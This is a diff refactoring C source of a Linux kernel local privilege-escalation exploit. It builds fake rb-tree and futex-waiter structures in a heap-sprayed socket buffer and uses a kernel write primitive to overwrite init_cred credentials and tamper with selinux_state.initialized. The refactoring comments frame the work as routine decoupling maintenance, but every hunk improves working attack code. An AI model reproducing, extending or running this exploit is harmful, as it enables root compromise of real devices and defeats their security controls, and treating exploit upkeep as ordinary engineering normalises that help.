@@ -41,25 +41,6 @@ uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
 
-int pselect_custom_write;
-uintptr_t pselect_custom_target;
-int pselect_child_node;  /* Preserve initialized bytes when set. */
-
-/* Decoupling plan: configure the next legacy payload write. Inputs: target and
- * mode; output: implicit globals. Future: write_request_init() returning an
- * immutable WriteRequest passed to payload and route functions. */
-void set_pselect_write_mode(uintptr_t target, int mode) {
-  pselect_custom_target = target;
-  pselect_custom_write = mode;
-}
-
-/* Decoupling plan: clear legacy write globals. Input/output: implicit write
- * state. Future: remove after callers use scoped immutable WriteRequest. */
-void clear_pselect_write(void) {
-  pselect_custom_write = 0;
-  pselect_custom_target = 0;
-}
-
 /* Decoupling plan: decide whether TCP zerocopy is selected. Inputs: profile and
  * runtime-config snapshot; output: boolean. Future:
  * tcp_zerocopy_supports(profile, config), with no environment reread. */
@@ -510,7 +491,7 @@ void prepare_ctxs(void) {
 /* Decoupling plan: construct shared fake objects and route-specific waiter data.
  * Inputs: profile, addresses, immutable WriteRequest and page base; outputs:
  * payload bytes/layout. Future: build_payload() plus three chain encoders. */
-int prepare_skb_payload(uintptr_t base) {
+int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
   int tcp = tcp_route_selected();
@@ -523,26 +504,16 @@ int prepare_skb_payload(uintptr_t base) {
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + fake_task_off;
-  fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (pselect_custom_write) {
-    if (pselect_child_node) {
-      if (pselect_custom_write == 2) {
-        fake_right = data_addr(g_init_cred_image);
-      } else {
-        /* The compact rb_erase primitive also writes dest-8 at child+8.
-         * Keep that side effect in this payload's private scratch slot. The
-         * caller quarantines the reclaim socket until scratch+8 is repaired. */
-        fake_right = base + 0x100;
-      }
-    } else {
-      fake_right = 0;  /* leaf: write 0 */
-    }
-    fake_left = 0;
-    if (pselect_custom_write == 2) {
-      fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
-    }
-    fake_parent = pselect_custom_target - 8;
-  }
+  uintptr_t default_fops = payload_base + FOPS_TABLE_OFF;
+  uintptr_t credential_fops =
+      payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+  PayloadWriteLayout write_layout = payload_write_layout(
+      request, base, default_fops, credential_fops,
+      data_addr(g_init_cred_image));
+  fake_parent = write_layout.parent;
+  fake_right = write_layout.right;
+  fake_left = write_layout.left;
+  fake_fops = write_layout.fops;
 
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
@@ -555,6 +526,9 @@ int prepare_skb_payload(uintptr_t base) {
   uint64_t pi_top_task = SLIDE_INIT_TASK;
 
   int compact = active_offsets && active_offsets->compact_waiter;
+  // TODO(decoupling:S08-payload-profile): Future: payload_build_shared_layout()
+  // receives TargetProfile. Input: immutable profile/request; output: bytes.
+  // Blocked by: semantic profile accessors; completion removes this TODO.
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + chunk_bias;
@@ -574,15 +548,10 @@ int prepare_skb_payload(uintptr_t base) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (write_right) {
-        put64(p, W0_OFF + 0x18, write_right);
-        put64(p, W0_OFF + 0x20, 0);
-        put64(p, W0_OFF + 0x28, pselect_custom_target);
-      } else {
-        put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
-        put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
-        put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
-      }
+      if (tcp)
+        build_tcp_zerocopy_payload(p + W0_OFF, request, &write_layout);
+      else
+        build_select_stack_payload(p + W0_OFF, &write_layout);
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
       put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
       put32(p, W0_OFF + 0x40, 0);           /* wake_state */
@@ -642,7 +611,7 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (pselect_custom_write >= 2 &&
+    if (write_layout.needs_credential_copy &&
         !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)) {
       return 0;
     }
@@ -653,7 +622,7 @@ int prepare_skb_payload(uintptr_t base) {
 /* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
  * Inputs: HeapContext, profile and payload request; output: PayloadPage/status.
  * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
-uintptr_t prepare_kernel_page(void) {
+uintptr_t prepare_kernel_page(const WriteRequest *request) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
   /* Release every userspace reference from the preceding write before the
@@ -787,7 +756,7 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if (!prepare_skb_payload(base)) {
+  if (!prepare_skb_payload(base, request)) {
     kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -868,14 +837,14 @@ uintptr_t prepare_kernel_page(void) {
 /* Decoupling plan: retry heap preparation until a usable page is available.
  * Inputs: HeapContext and request; output: PayloadPage/status. Future:
  * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
-uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 12;
+uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
+  int max_attempts = 4;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
   deadline.tv_sec += 240;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    uintptr_t base = prepare_kernel_page();
+    uintptr_t base = prepare_kernel_page(request);
     if (base) {
       /* W1 stores this page address, so the word's byte 2 lands on
        * selinux_state.initialized. an even byte there fails every SID lookup */
